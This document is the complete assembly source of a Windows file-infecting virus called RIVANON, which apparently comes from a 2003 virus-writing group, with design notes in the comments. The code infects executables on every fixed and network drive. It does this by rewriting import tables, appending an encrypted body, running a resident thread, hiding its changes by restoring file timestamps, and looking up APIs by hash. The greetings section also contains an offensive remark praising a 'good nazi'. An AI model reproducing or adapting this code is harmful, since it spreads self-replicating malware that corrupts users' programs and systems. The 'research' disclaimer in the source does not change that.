
;RIVANON virus, version 3.9 by Doxtor L. [TKT], June 2003.
;Contact: doxtorl38@yahoo.fr

;This source code is intended to be compiled using FASM, an open source
;assembler easily available on the web.



;Some not so usual features:

;* This virus don't change entry point of infected programs.
;* This virus don't patch opcodes of infected programs.
;* This virus don't change section attributes of infected programs.


;Here a list of some standard features used:

;* Use of a thread to make the virus 'residant'.
;* Use of hash codes to retrieve functions of Kernel32 needed.
;* Use of a traversal directory routine to parse all drives.
;* Use of SEH to make the virus more stable.
;* Use of the last section to put the main part of virus.
;* Use of encryption with a 'random' key.
;* Use of mutex to avoid to have several instances of virus infecting
;  in same time.



;How does this virus work?

;This virus is my new attempt to use a non-standard E.P.O (entry point
;obscuring) technique. My last attempt in the same way was the writing of 
;idele virus. Unfortunately this virus was a bit limited to not say buggy.
;I think RIVANON virus fixes the main 'bug' of idele virus yet RIVANON was
;totally re-written.

;The idea is to create a new import table therefore the 'old' table will be
;not changed when Windows will load the program in memory but the program will
;continue to 'believe' this table is still alright.The 'old' table can be fill
;up with addresses we want. These addresses will be pointing to addresses of
;elements of a 'push table'. What's that?  

;When a host program will call a function from Kernel32 several push's will be
;executed depending wich function is called. The number of push's executed
;will be used to know wich function of Kernel32 was called by host program.
;Sometime, Idele virus wasn't able to know wich function was called.
;After the push's, there is a small routine used to decrypt and allocate some
;memory to put the main part of virus there. GlobalAlloc function from
;Kernel32 is used to achieve this. For Windows this function is the only one
;imported from Kernel32 by an infected program.

;The virus will put a loader routine in the end of code section of target
;programs. A data section with 'writeable' attribute will be used to put the
;new 'import table'. The main code will be put in the end of last section.

;This virus was tested on both Windows98 SE and Windows 2000.
;Main tests were performed on notepad.exe and calc.exe from Windows98,
;These programs when they were infected were still running fine on both
;Windows 98 and Windows 2000. For Windows XP i don't have a clue because
;i don't use it.


;Here a list of macros and subroutines used:

;* proc_infectieuse				: start of thread code
;* GEN_ALEATOIRE				; random generator
;* RECHERCHE_CIBLE_DANS_REPERTOIRE_COURANT	: routine to find targets
;						  in current directory
;* INFECTION					: routine to modify target
;* proc_seh					: seh handler
;* copie_chaine					: routine to copy ASCII
						; string null terminated.
;* rva_vers_adr_map				; rva to map address routine
;* adr_map_vers_rva				; map address to rva routine
;* aligne					; align section size fields
;* debut_loader					; loader routine




;The source code has some comments in french. Anyway, this source code
;isn't intended to be read by beginners in vx world. The advanced vxers
;don't really need comments to understand how this code works, the code is
;enough structured to make it readable without comments.



;DISCLAIMER:

;This program is a virus, it's not destructive but has ability to infect
;all O.S Win32 based computers. I don't release this source code to be used
;to infect innocent user puters. It was created for research aims.

;Your are the only responsible if you decide to run it.

;IF YOU DON'T KNOW WHAT YOU'RE DOING, DON'T COMPILE IT!


;Greetings:


;Virusbuster    : Thanks to publish my stuff.
;Lord Julus 	: For your working search traversal routine.
;Darkman	: A good nazi can sing Horst Vessel lied by heart.
;Morphie	: Too bad we didn't meet in Paris.
;Gigabyte	: Editing a vx e-zine is a hard job you're right.
;Toofic		: I'm not a pervert old man.
;Mandrag0re	: Who's the next to be hacked?
;Emper0r	: Thanks to publish my stuff in IOC.
;Delly		: A good magician can make disappear everything..but you're
;		  the greatest, you can make appear weed everywhere!
;Cryptic	: I remember i must install my network card.
;Gato		: I hope everything is alright now, no news from you.
;Slagehammer	: A new sample  for your collection.
;Vecna		: I'm wondering what is your contribution to 29a7!

;And all members of TKT group

	 	
;IN MEMORY OF T2




format PE GUI
entry commencement

include		'include\macro\import.inc'
include		'include\macro\stdcall.inc'
include		'include\exehdr.inc'
include		'include\kernel.inc'



DEBUG=TRUE
ADR_BASE=400000h
ALIGNEMENT_FICHIER_STANDARD=200h
ALIGNEMENT_MEMOIRE_STANDARD=1000h
DUREE_PAUSE1=120000
DUREE_PAUSE2=30000
MODULE=4235536237
SIGNATURE_VIRAL equ 'VX'

if DEBUG=TRUE
TYPE_FICHIER_RECHERCHE0 equ 'e'
SEH=FALSE
display "YOU'RE COMPILING THE DEBUG VERSION OF RIVANON VIRUS",CRLF
else
TYPE_FICHIER_RECHERCHE0 equ '*'
SEH=TRUE
display "YOU'RE COMPILING INFECTIOUS VERSION OF RIVANON VIRUS",CRLF
end if
display "IF YOU DON'T KNOW WHAT YOU'RE DOING PLEASE ERASE THIS PROGRAM",CRLF

TYPE_FICHIER_RECHERCHE1	equ 'x.ex'
TOUT_FICHIER		equ '*'
REMONTE			equ '..'
REPERTOIRE_COURANT	equ '.'
REPERTOIRE_PARENT	equ REMONTE
DERNIER_3_BIT=111b



;'strutures':
IMAGE_DOS_HEADER	ecx,edx,edi
IMAGE_FILE_HEADER	ecx,edx,esi
IMAGE_OPTIONAL_HEADER	edx,edi
IMAGE_SECTION_HEADER	esi,edi
IMAGE_DATA_DIRECTORY	eax,esi
IMAGE_IMPORT_DESCRIPTOR	esi
IMAGE_IMPORT_BY_NAME	eax
IMAGE_EXPORT_DIRECTORY	eax
WIN32_FIND_DATA		edi,eax

adr_mem_alloc dd 0


;macros utilisees par le virus:

macro GEN_ALEATOIRE
{

;generateur aleatoire base sur BBS:
pushad
mov ebx,MODULE
mov eax,[seed+ebp]
mul eax
div ebx
mov [seed+ebp],edx
popad
}

;[Debut du code de la fonction principale du virus]:

macro	INFECTION
{

infection:

pushad

if SEH=TRUE
push ebp
lea eax,[proc_seh+ebp]
push eax dword [fs:0]
mov dword [fs:0],esp
end if

;[Ouverture du fichier cible et creation de son image memoire]:

lea edi,[struct_recherche+ebp]
lea esi,[edi.WFD_szFileName]
stdcall [SetFileAttributesA+ebp],esi,FILE_ATTRIBUTE_NORMAL

add dword [edi.WFD_nFileSizeLow],TAILLE_VIRUS_ALIGNE_FICHIER

xor ebx,ebx
stdcall [CreateFileA+ebp],esi,GENERIC_READ or GENERIC_WRITE,\
FILE_SHARE_READ,ebx,OPEN_EXISTING,ebx,ebx
inc eax
jz err_infection
dec eax
mov [handle_fichier_cible+ebp],eax

stdcall [CreateFileMappingA+ebp],eax,ebx,PAGE_READWRITE,ebx,\
dword [edi.WFD_nFileSizeLow],ebx
test eax,eax
jz err_infection
mov [handle_map_cible+ebp],eax

stdcall [MapViewOfFile+ebp],eax,FILE_MAP_ALL_ACCESS,ebx,ebx,ebx
test eax,eax
jz err_infection

mov [adr_map_cible+ebp],eax
mov edx,eax

;[Fin de la creation de l'image memoire du fichier cible]

;[Debut de la verification du fichier cible]:

cmp word [edx.MZ_magic],MZ_MAGIC
jnz err_infection

movzx eax,word [edx.MZ_csum]
cmp word [edx.MZ_csum],SIGNATURE_VIRAL
jz err_infection

mov eax,dword [edx.MZ_lfanew]
cmp eax,dword [edi.WFD_nFileSizeLow]
jae err_infection

add edx,eax
mov [adr_map_IMAGE_FILE_HEADER_cible+ebp],edx

cmp dword [edx.FH_Signature],PE_MAGIC
jnz err_infection


;[Debut de la recherche de la section 'code', la section qui contient
;le point d'entree du programme cible]:

movzx ebx,word [edx.FH_SizeOfOptionalHeader]
movzx ecx,word [edx.FH_NumberOfSections]
push ecx
add edx,sizeof.IMAGE_FILE_HEADER

mov [adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp],edx

mov dword [edx.OH_FileAlignment],ALIGNEMENT_FICHIER_STANDARD


mov eax,dword [edx.OH_ImageBase]
mov [adr_image_base+ebp],eax

;a partir d'ici la variable adr_image_base concerne la cible

mov eax,dword [edx.OH_AddressOfEntryPoint]
add edx,ebx
mov [adr_map_IMAGE_SECTION_HEADER_cible+ebp],edx
mov esi,edx

recherche_section_code:
cmp dword [esi.SH_VirtualAddress],eax
ja section_code_trouve
add esi,sizeof.IMAGE_SECTION_HEADER
loop recherche_section_code

jmp err_infection


section_code_trouve:
;[Fin de la routine de recherche de la section 'code];


;[Debut de la localisation d'un espace 'vide' et de sa taille dans
;la fin de la section 'code']:
mov edi,dword [esi.SH_PointerToRawData]
add edi,[adr_map_cible+ebp]
dec edi
std
xor eax,eax
xor ecx,ecx
dec ecx
rep scasb
neg ecx
sub ecx,10	;pour tenir compte de la presence eventuelle d'une
add edi,10	;'table d'import' (celle ci se finissant par db 0,0,0,0)
		
mov [nbre_octet_libre_sect_code_cible+ebp],ecx
mov [adr_map_espace_libre_sect_code_cible+ebp],edi

sub esi,sizeof.IMAGE_SECTION_HEADER
call aligne
pop ecx

;si la section code a l'attribut ecriture mieux vaut abandonner l'infection:
test dword [esi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
jnz err_infection

;[Fin de la localisation d'un espace dans la section 'code']




;[Debut de la localisation d'un espace vide a la fin d'une section 'data']:

mov esi,edx

recherche_section_data:
test dword [esi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
jnz section_data_trouve
add esi,sizeof.IMAGE_SECTION_HEADER
loop recherche_section_data

jmp err_infection

section_data_trouve:
cmp dword [esi.SH_PointerToRawData],0
jz recherche_section_data

dec ecx
jz err_infection
inc ecx

mov edi,dword [esi.SH_PointerToRawData+sizeof.IMAGE_SECTION_HEADER]
add edi,[adr_map_cible+ebp]

sub edi,4
cmp dword [edi],0
jnz recherche_section_data
sub edi,4
cmp dword [edi],0
jnz recherche_section_data

mov [adr_map_espace_libre_sect_data_cible+ebp],edi
call aligne

;[Fin de la localisation d'un espace vide dans la section 'data']



;[Recherche de le structure IMAGE_IMPORT_DESCRIPTOR dediee aux imports
;de Kernel32]:

mov edx,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]
lea esi,[edx+sizeof.IMAGE_OPTIONAL_HEADER+sizeof.IMAGE_DATA_DIRECTORY]

;esi pointe sur la structure IMAGE_DATA_DIRECTORY dediee a l'import:
mov esi,dword [esi.DD_VirtualAddress]


stdcall rva_vers_adr_map,esi
mov esi,eax

sub esi,sizeof.IMAGE_IMPORT_DESCRIPTOR

recherche_k32_image_import_descriptor:

add esi,sizeof.IMAGE_IMPORT_DESCRIPTOR
mov edi,dword [esi.ID_Name]
test edi,edi
jz err_infection

stdcall rva_vers_adr_map,edi
mov edi,eax

cmp dword [edi],'KERN'
jnz recherche_k32_image_import_descriptor

add edi,4

cmp dword [edi],'EL32'
jnz recherche_k32_image_import_descriptor

mov [adr_map_IMAGE_IMPORT_DESCRIPTOR_cible+ebp],esi

;[Fin de la recherche de la structure IMAGE_IMPORT_DESCRIPTOR]

mov eax,[esi.ID_FirstThunk]
push eax
add eax,[adr_image_base+ebp]
mov [adr_1st_thunk_avant_infection_hote+ebp],eax
pop eax

stdcall rva_vers_adr_map,eax
mov [adr_map_1st_thunk_k32_cible+ebp],eax

mov esi,dword [esi.ID_OriginalFirstThunk]
test esi,esi
jz err_infection

mov [rva_orig_1st_thunk_avant_infection_hote+ebp],esi

stdcall rva_vers_adr_map,esi
mov [adr_map_original_1st_thunk_k32_cible+ebp],eax



;[Debut du calcul du nombre de fonctions de Kernel32 importees par le
;programme cible]:

mov esi,eax
mov edi,eax
cld
xor eax,eax
xor ecx,ecx
dec ecx
repne scasd
neg ecx
dec ecx
dec ecx

mov [nbre_fct_k32_cible+ebp],ecx

lea ebx,[ecx+TAILLE_LOADER+2*sizeof.IMAGE_THUNK_DATA]
mov ecx,[nbre_octet_libre_sect_code_cible+ebp]
sub ecx,ebx
jl err_infection

add [adr_map_espace_libre_sect_code_cible+ebp],ecx

;[Fin du calcul du nombre de fonctions importees de Kernel32]

mov ebx,esi

;[Recherche d'une fonction de Kernel32 importee par la cible
;dont le nom a au moins 11 symboles]:

xor ebx,ebx
dec ebx

recherche_nom_fct_k32_cible:
inc ebx
lodsd
test eax,eax
jz err_infection

mov [rva_IMAGE_IMPORT_BY_NAME_cible+ebp],eax
mov ecx,eax
stdcall rva_vers_adr_map,eax
lea edi,[eax.IBN_Name]
mov edx,edi

pushad
xor eax,eax
xor ecx,ecx
mov cl,11
repne scasb
popad
jz recherche_nom_fct_k32_cible


;[Fin de la verification du fichier cible]



pushad
mov esi,edx
mov word [esi-2],0
mov [index_fct_k32_altere_hote+ebp],ebx
lea edi,[sz_nom_fct_k32_altere_hote+ebp]
call copie_chaine

lea esi,[sz_nom_globalalloc+ebp]

mov edi,edx
call copie_chaine
popad

;[Fin de la recherche d'une fonction de Kernel32 importee dont le nom a au
;moins 11 symboles]


;mov edi,[adr_map_espace_libre_sect_code_cible+ebp]
mov edi,[adr_map_espace_libre_sect_data_cible+ebp]


stdcall adr_map_vers_rva,edi
mov ebx,eax

mov eax,[rva_IMAGE_IMPORT_BY_NAME_cible+ebp]

stosd		;la RVA de la structure IMAGE_IMPORT_BY_NAME de Kernel32 est
		;transferee dans la section code. La RVA de l'emplacement
		;contenant ceci sera la nouvelle valeur FirstThunk de la
		;cible.


mov edi,[adr_map_IMAGE_IMPORT_DESCRIPTOR_cible+ebp]

xor eax,eax
stosd			;construction OriginalFirstThunk
stosd			;TimeDateStamp
stosd			;ForwarderChain
add edi,4
mov eax,ebx		;construction FirstThunk
stosd

add ebx,[adr_image_base+ebp]
mov [ptr1_adr_globalalloc+ebp],ebx
mov [ptr2_adr_globalalloc+ebp],ebx


;[Debut de la reconstruction de la table des thunk_data pointee par
;first_thunk]:

mov eax,[adr_map_espace_libre_sect_code_cible+ebp]
push eax
stdcall adr_map_vers_rva,eax
add eax,[adr_image_base+ebp]

mov ecx,[nbre_fct_k32_cible+ebp]
push ecx
mov edi,[adr_map_1st_thunk_k32_cible+ebp]

element_suivant_tab_thunk_data:
stosd
inc eax
loop element_suivant_tab_thunk_data

;[Fin de la reconstruction de la table]



;[Debut de la construction de la "table des push"]:

sub eax,[adr_image_base+ebp]
stdcall rva_vers_adr_map,eax

mov [adr_map_loader_sect_code_cible+ebp],eax

pop ecx
pop edi

;[Determination de l'instruction PUSH qui va etre transferee]:

lea eax,[struct_recherche+ebp]
mov al,[eax.WFD_szFileName]
and al,DERNIER_3_BIT
add al,50h

;[Fin de la determination]

element_suivant_table_push:
stosb
loop element_suivant_table_push

;[Fin de la construction de la "table des push"]



;[Debut de la destruction de l'en-tete de la directory BOUND_IMPORT_DIRECTORY]:

mov edi,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]
lea edi,[edi+sizeof.IMAGE_OPTIONAL_HEADER+11*sizeof.IMAGE_DATA_DIRECTORY]
xor eax,eax
stosd
stosd

;[Fin de la destruction]


;[Debut de la routine de transfert des deux parties du virus]:

mov esi,[adr_map_IMAGE_FILE_HEADER_cible+ebp]

movzx ecx,word [esi.FH_NumberOfSections]
dec ecx


mov eax,sizeof.IMAGE_SECTION_HEADER
mul ecx
mov esi,[adr_map_IMAGE_SECTION_HEADER_cible+ebp]
lea esi,[esi+eax]

lea edx,[esi.SH_SizeOfRawData]

mov ecx,dword [edx]

add dword [edx],TAILLE_VIRUS_ALIGNE_FICHIER
add dword [esi.SH_VirtualSize],TAILLE_VIRUS_ALIGNE_MEMOIRE

call aligne

mov edx,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]
add dword [edx.OH_SizeOfImage],TAILLE_VIRUS_ALIGNE_MEMOIRE

mov edx,dword [esi.SH_PointerToRawData]

add edx,ecx

add edx,dword [adr_map_cible+ebp]

stdcall adr_map_vers_rva,edx
add eax,[adr_image_base+ebp]


mov [adr_fin_derniere_sect_hote+ebp],eax

GEN_ALEATOIRE
mov eax,[seed+ebp]
mov byte [clef+ebp],al

mov edi,[adr_map_loader_sect_code_cible+ebp]
lea esi,[debut_loader+ebp]
cld
mov ecx,TAILLE_LOADER
rep movsb

lea esi,[debut_virus+ebp]
mov edi,edx
mov ecx,TAILLE_VIRUS
call crypt


;on marque la cible pour ne pas la reinfecter
mov edi,[adr_map_cible+ebp]
lea edi,[edi.MZ_csum]
mov ax,'VX'
stosw

;[Fin de la routine de transfert des deux parties du virus]

jmp sortie_infection

err_infection:
lea edi,[struct_recherche+ebp]

sub dword [edi.WFD_nFileSizeLow],TAILLE_VIRUS_ALIGNE_FICHIER


;[Debut de la restitution a l'O.S et de la fermeture du fichier cible]:

sortie_infection:

lea edi,[struct_recherche+ebp]
stdcall [UnmapViewOfFile+ebp],[adr_map_cible+ebp]
stdcall [CloseHandle+ebp],[handle_map_cible+ebp]

xor ebx,ebx
mov esi,[handle_fichier_cible+ebp]
stdcall [SetFilePointer+ebp],esi,dword [edi.WFD_nFileSizeLow],ebx,ebx

stdcall [SetEndOfFile+ebp],esi

lea eax,[edi.WFD_ftLastWriteTime]
push eax
lea eax,[edi.WFD_ftLastAccessTime]
push eax
lea eax,[edi.WFD_ftCreationTime]
push eax
push esi
call [SetFileTime+ebp]


stdcall [CloseHandle+ebp],esi

lea eax,[edi.WFD_szFileName]
stdcall [SetFileAttributesA+ebp],eax,dword [edi.WFD_dwFileAttributes]

;[Fin de la fermeture du fichier cible]

if SEH=TRUE
pop dword [fs:0]
pop eax
pop ebp
end if

popad
}

;[Fin de la fonction infectieuse]







;[Debut de la recherche dans le repertoire courant]:


macro	RECHERCHE_CIBLE_DANS_REPERTOIRE_COURANT
{

recherche_cible_dans_repertoire_courant:

pushad

push TYPE_FICHIER_RECHERCHE0
push TYPE_FICHIER_RECHERCHE1
mov eax,esp
stdcall [FindFirstFileA+ebp],eax,edi
pop ecx ecx
mov ebx,eax
inc eax
jz sortie_recherche_fichier

fichier_suivant:

INFECTION

stdcall [FindNextFileA+ebp],ebx,esi
test eax,eax
jnz fichier_suivant

sortie_recherche_fichier:
popad

}

;[Fin de la recherche dans le repertoire courant]



;[Debut du programme hote regulier]:

commencement:

invoke faux_Sleep,DUREE_PAUSE1
invoke faux_ExitProcess,0

;[Fin du programme hote regulier]




__ExitProcess:
push eax
__Sleep:
push eax

execution_fct_k32:
pushad






;[Debut reel du virus]:

debut_virus:

;[Calcul du decalage du a la relocation du code du virus]:

call ici
ici:
pop ebp
sub ebp,ici

;[Fin du calcul du a la relocation]



;Premiere execution du code viral


;[Debut de la recherche de l'adresse de Kernel32]:

db 8bh,15h		;mov edx,[<adr>]
ptr1_adr_globalalloc dd ExitProcess


;[Debut de la remise a zero de l'emplacement dans la section 'data' utilise]:

mov edi,[ptr1_adr_globalalloc+ebp]
xor eax,eax
stosd

;[Fin de la remise a zero]

mov eax,edx

recherche_mz:
dec edx
cmp word [edx.MZ_magic],MZ_MAGIC
jnz recherche_mz

;une signature "MZ" a ete trouvee

mov ecx,edx
mov ecx,dword [ecx.MZ_lfanew]
add ecx,edx
jc recherche_mz

cmp ecx,eax
ja recherche_mz

cmp dword [ecx.FH_Signature],PE_MAGIC
jnz recherche_mz

;[Fin de recherche de l'adresse de Kernel32]

;ecx pointe sur l'en-tete IMAGE_FILE_HEADER de Kernel32
;edx contient l'adresse de Kernel32




;[Debut de la recherche des fonctions de Kernel32 utilisees par le virus]:

;eax pointe sur le debut de la structure IMAGE_DIRECTORY_DATA de la directory
;export:

lea eax,[ecx+sizeof.IMAGE_FILE_HEADER+sizeof.IMAGE_OPTIONAL_HEADER]

mov eax,dword [eax.DD_VirtualAddress]
add eax,edx

mov esi,dword [eax.ED_AddressOfNames]
add esi,edx

or ebx,-1
mov ecx,NBRE_FCT_K32_VIRUS
sub esi,4

recherche_adr_fct_k32_virus:

add esi,4
inc ebx

;[Debut du calcul d'un condense pour le nom de la fonction de Kernel32
;en cours de test]:

pushad
mov esi,dword [esi]
add esi,edx

xor eax,eax
xor ecx,ecx

caractere_suivant:

lodsb
or al,al
jz fin_chaine
add cl,al
rol eax,cl
add ecx,eax
jmp caractere_suivant

fin_chaine:
mov [condense+ebp],ecx
popad

;[Fin du calcul du condense]

;[Debut de la recherche du condense dans la table des condenses pre-calcules
;des fonctions de Kernel32 utilisees par le virus]:

push eax
push ecx
mov eax,[condense+ebp]
mov ecx,NBRE_FCT_K32_VIRUS
lea edi,[tab_condense+ebp]
repne scasd
pop ecx
pop eax
jnz recherche_adr_fct_k32_virus


;[Fin de la recherche du condense dans la table]


;[Recuperation de l'adresse de la fonction de Kernel32 dont le condense du nom
;est dans la table]:

pushad
mov ecx,dword [eax.ED_AddressOfNamesOrdinals]
add ecx,edx

movzx ebx,word [ecx+2*ebx]

mov ecx,dword [eax.ED_AddressOfFunctions]
add ecx,edx

mov ecx,dword [ecx+4*ebx]
add ecx,edx

add edi,4*NBRE_FCT_K32_VIRUS-4
mov dword [edi],ecx

popad

;[Fin de la recuperation de l'adresse de la fonction de Kernel32]

loop recherche_adr_fct_k32_virus

;[Fin de la recherche des fonctions de Kernel32 utilisees par le virus]





;[Debut de la recuperation des adresses des fonctions de Kernel32 utilisees
;par l'hote]:

mov esi,[rva_orig_1st_thunk_avant_infection_hote+ebp]
add esi,[adr_image_base+ebp]

lea edi,[tab_adr_fct_k32_hote+ebp]

explore_struct_import_by_name_k32_hote:

lodsd
test eax,eax
jz fin_recuperation_fct_k32_hote

add eax,[adr_image_base+ebp]

pushad
lea ebx,[eax.IBN_Name]
stdcall [GetProcAddress+ebp],edx,ebx
mov dword [esp+28],eax
popad			;seulement eax est modifie


stosd
jmp explore_struct_import_by_name_k32_hote

fin_recuperation_fct_k32_hote:

;[Recuperation de la fonction de Kernel32 dont la structure
;IMPORT_BY_NAME a ete changee pour accueillir le nom GlobalAlloc]:

pushad
lea ebx,[sz_nom_fct_k32_altere_hote+ebp]
stdcall [GetProcAddress+ebp],edx,ebx
mov ecx,[index_fct_k32_altere_hote+ebp]
lea edi,[tab_adr_fct_k32_hote+4*ecx+ebp]
stosd
popad


;[Fin recuperation de la derniere fonction de Kernel32 de l'hote]

;[Fin de la recuperation des adresses utilisees par l'hote]



;[Debut de la restauration de la table pointee par ID_FirstThunk, telle qu'elle
;serait apres demarrage de l'hote qui n'aurait pas ete infecte]:

mov ecx,[nbre_fct_k32_cible+ebp]
push ecx
shl ecx,2

lea eax,[tampon+ebp]
mov ebx,[adr_1st_thunk_avant_infection_hote+ebp]
stdcall [VirtualProtect+ebp],ebx,ecx,PAGE_EXECUTE_READWRITE,eax

pop ecx

lea esi,[tab_adr_fct_k32_hote+ebp]
mov edi,ebx
cld
rep movsd

;[Fin de la restauration de la table]



;[Debut de creation de la thread infectieuse]:

lea esi,[thread_id+ebp]
lea edi,[proc_infectieuse+ebp]
xor eax,eax
stdcall [CreateThread+ebp],eax,eax,edi,eax,eax,esi

;[Fin de la creation de la thread]



;[Determination de l'adresse de la fonction de Kernel32 appelee par l'hote]:

renvoi_vers_fonction_appele:

;transfert du contenu des 8 premiers elements de la pile qui proviennent d'un
;PUSHAD

mov esi,esp
xor ecx,ecx
mov cl,8
cld
lea edi,[tampon_registre+ebp]
rep movsd

add esp,4*8

;on compte le nombre d'elements semblables consecutifs dans la pile

xor ecx,ecx
inc ecx

pop eax

test_pile:
pop ebx
cmp ebx,eax
jnz fin_test_pile
inc ecx
jmp test_pile

fin_test_pile:

push ebx
mov ebx,[nbre_fct_k32_cible+ebp]
sub ebx,ecx
mov eax,[tab_adr_fct_k32_hote+4*ebx+ebp]

pushad
;on restaure la pile telle qu'elle devrait etre sans les PUSH successifs, le
;sommet de la pile sera occupe par les valeurs mises par le PUSHAD du loader

lea esi,[tampon_registre+ebp]
mov edi,esp
xor ecx,ecx
mov cl,8
rep movsd
xchg [esp+28],eax
popad
jmp eax		;fait suivre l'appel a la fonction de Kernel32 appelee


;[Fin de la determination de la fonction appelee]










;[Debut du code de la thread infectieuse]:

proc_infectieuse:

call suite
suite:
pop ebp
sub ebp,suite

mov ebx,'B:\'

faire_une_pause:
stdcall [Sleep+ebp],DUREE_PAUSE2


;[Verification de la presence du virus en memoire]:

lea edi,[signature+ebp]

stdcall [CreateMutexA+ebp],NULL,TRUE,edi
mov [handle_mutex+ebp],eax
test eax,eax
jz fin_thread

call [GetLastError+ebp]
test eax,eax
jnz fin_thread


;[Fin de la verification]




;[Debut de la recherche de programmes cibles]:

recherche_cible:


;[Debut de la determination du drive a explorer]:

cherche_drive:
mov ah,0
mov al,bl
sub al,40h
mov cl,26
div cl
mov bl,ah
add bl,41h

stdcall [GetDriveTypeA+ebp],esp,ebx
pop ecx
cmp al,DRIVE_FIXED
jz exploration_repertoire
cmp al,DRIVE_REMOTE
jnz cherche_drive

;[Fin de la determination du drive a explorer]


;[Debut de l'exploration des repertoires et sous-repertoires]:

exploration_repertoire:
pushad
                                     
repertoire_base_recherche:
stdcall [SetCurrentDirectoryA+ebp],esp,ebx
pop eax

xor esi,esi				;esi, nombre de handles dans  la pile
lea edi,[ebp+struct_recherche]

recherche_premier_repertoire:
push TOUT_FICHIER
mov eax,esp
stdcall [FindFirstFileA+ebp],eax,edi
pop ecx

inc eax
je pas_de_sous_repertoire
dec eax

mov ebx,eax

est_ce_un_repertoire:
test dword  [edi.WFD_dwFileAttributes],10h
je recherche_repertoire_suivant

lea eax, [edi.WFD_szFileName]

cmp word [eax],REPERTOIRE_COURANT
je recherche_repertoire_suivant

cmp word [eax],REPERTOIRE_PARENT
je recherche_repertoire_suivant

stdcall [SetCurrentDirectoryA+ebp],eax

RECHERCHE_CIBLE_DANS_REPERTOIRE_COURANT

push ebx
inc esi
jmp recherche_premier_repertoire

recherche_repertoire_suivant:
stdcall [FindNextFileA+ebp],ebx,edi
test eax,eax
jnz est_ce_un_repertoire

plus_de_sous_repertoire:
stdcall [FindClose+ebp],ebx

pas_de_sous_repertoire:
stdcall [SetCurrentDirectoryA+ebp],esp,REMONTE
pop eax

or esi,esi
jz fin_de_la_recherche

dec esi
pop ebx
jmp recherche_repertoire_suivant

fin_de_la_recherche:
popad


;[Fin de l'exploration]


fin_thread:
stdcall [CloseHandle+ebp],[handle_mutex+ebp]
jmp faire_une_pause

;[Fin de la recherche de programmes cibles]

;[Fin du code de la thread infectieuse]





;[Debut de la routine qui intercepte les erreurs]:

if SEH=TRUE
proc_seh:
mov esp,[esp+8]
mov ebp,[esp+8]
jmp err_infection
end if

;[Fin de la routine qui intercepte les erreurs]




;[Debut de la fonction de recopie d'une chaine de caracteres terminee par 0]:
copie_chaine:

pushad
octet_suivant:
lodsb
stosb		;meme le 0 final de la chaine est recopie
cmp al,0
jnz octet_suivant
popad
ret

;[Fin de la fonction de recopie]




;[Debut de la fonction de conversion d'une RVA en une adresse dans le fichier
;image memoire]:

rva_vers_adr_map:

pop eax
xchg eax,[esp]
pushad
mov edx,[adr_map_IMAGE_FILE_HEADER_cible+ebp]
movzx ecx,word [edx.FH_NumberOfSections]

mov esi,[adr_map_IMAGE_SECTION_HEADER_cible+ebp]

cherche_section_par_rva:
cmp dword [esi.SH_VirtualAddress],eax
ja rva_localise
add esi,sizeof.IMAGE_SECTION_HEADER
loop cherche_section_par_rva

rva_localise:
sub esi,sizeof.IMAGE_SECTION_HEADER
sub eax,dword [esi.SH_VirtualAddress]
add eax,dword [esi.SH_PointerToRawData]
add eax,[adr_map_cible+ebp]
mov dword [esp+28],eax
popad
ret


;[Fin de la fonction de conversion d'une RVA]


;[Debut de la fonction de conversion d'une adresse dans l'image memoire
;d'un fichier en une RVA]:

adr_map_vers_rva:
pop eax
xchg eax,[esp]
pushad
sub eax,[adr_map_cible+ebp]
mov edx,[adr_map_IMAGE_FILE_HEADER_cible+ebp]
movzx ecx,word [edx.FH_NumberOfSections]

mov esi,[adr_map_IMAGE_SECTION_HEADER_cible+ebp]

cherche_section:
cmp dword [esi.SH_PointerToRawData],eax
ja section_trouve
add esi,sizeof.IMAGE_SECTION_HEADER
loop cherche_section

section_trouve:
sub esi,sizeof.IMAGE_SECTION_HEADER
sub eax,dword [esi.SH_PointerToRawData]
add eax,dword [esi.SH_VirtualAddress]
mov dword [esp+28],eax
popad
ret

;[Fin de la fonction de conversion d'une adresse de l'image memoire
;d'un fichier]


;[Debut de la fonction d'alignement des champs taille d'une section]:

aligne:

;les champs taille de la section sur laquelle pointe esi sont alignes

pushad

mov edi,[adr_map_IMAGE_OPTIONAL_HEADER_cible+ebp]

;alignement memoire:

mov ebx,dword [edi.OH_SectionAlignment]
dec ebx
xor edx,edx
lea ecx,[esi.SH_VirtualSize]
mov eax,[ecx]
add eax,ebx
inc ebx
div ebx
mul ebx
mov [ecx],eax

;alignement fichier:

mov ebx,dword [edi.OH_FileAlignment]
dec ebx
lea ecx,[esi.SH_SizeOfRawData]
mov eax,[ecx]
add eax,ebx
inc ebx
div ebx
mul ebx
mov [ecx],eax
popad
ret

;[Fin de la fonction d'alignement]


;[Debut du code du loader du virus]:

debut_loader:
pushad

push 8000
push GPTR
db 0ffh,15h	;call [<adr>] appel a GlobalAlloc en fait
ptr2_adr_globalalloc dd ?
push eax
mov edi,eax
mov ecx,TAILLE_VIRUS
db 0beh		;mov esi,adr
adr_fin_derniere_sect_hote dd ?
crypt:
cld
octet_suivant_a_decrypter:
lodsb
db 34h		;xor al,value
clef db 0
stosb
loop octet_suivant_a_decrypter
exit_loader:
ret
TAILLE_LOADER=$-debut_loader

;[Fin du code du loader]

;zone de donnees qui vont etre greffees au programme cible:

seed						dd 1fac3b9dh
nbre_fct_k32_cible				dd 2
adr_image_base					dd ADR_BASE
adr_1st_thunk_avant_infection_hote		dd vrai_ID_FirstThunk_k32
rva_orig_1st_thunk_avant_infection_hote		dd RVA vrai_ID_OriginalFirstThunk_k32
index_fct_k32_altere_hote			dd 0
sz_nom_fct_k32_altere_hote			db 'ExitProcess'
rb 30
sz_nom_globalalloc				db 'GlobalAlloc',0
signature					db 'RIVANON',0
						db 'V 3.9, DrL. [TKT] June 2003'


;Les deux tables qui suivent doivent etre collees l'une a l'autre et l'ordre des elements
;de ces tables respecte.

tab_condense:

dd 0fdbe9ddfh		;CloseHandle
dd 04b00fba1h		;CreateFileA
dd 00d6ea22eh		;CreateFileMappingA
dd 0abfd70b5h		;CreateMutexA
dd 0be307c51h		;CreateThread
dd 0be7b8631h		;FindClose
dd 0c915738fh		;FindFirstFileA
dd 08851f43dh		;FindNextFileA
dd 09c3a5210h		;GetDriveTypeA
dd 091c21cb7h		;GetLastError
